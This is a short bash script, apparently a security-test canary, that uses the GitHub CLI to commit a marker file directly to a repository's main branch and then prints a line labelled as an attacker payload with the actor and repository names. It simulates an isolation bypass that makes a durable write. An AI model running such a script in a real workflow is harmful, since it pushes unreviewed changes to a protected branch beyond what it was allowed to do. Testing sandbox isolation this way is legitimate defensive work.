#!/usr/bin/env bash
set -eu
content="$(printf 'GH_R243_TEMP_ISOLATION_BYPASS\n' | base64 -w0)"
gh api --method PUT "repos/$GITHUB_REPOSITORY/contents/GH_R243_TEMP_ISOLATION_WRITE.txt" \
  -f message='GH-R243 bounded temp-isolation canary' \
  -f content="$content" \
  -f branch=main \
  --jq '{commit_sha:.commit.sha,path:.content.path}'
printf 'GH_R243_ATTACKER_PAYLOAD actor=%s repository=%s durable_write=requested\n' \
  "$GITHUB_ACTOR" "$GITHUB_REPOSITORY"
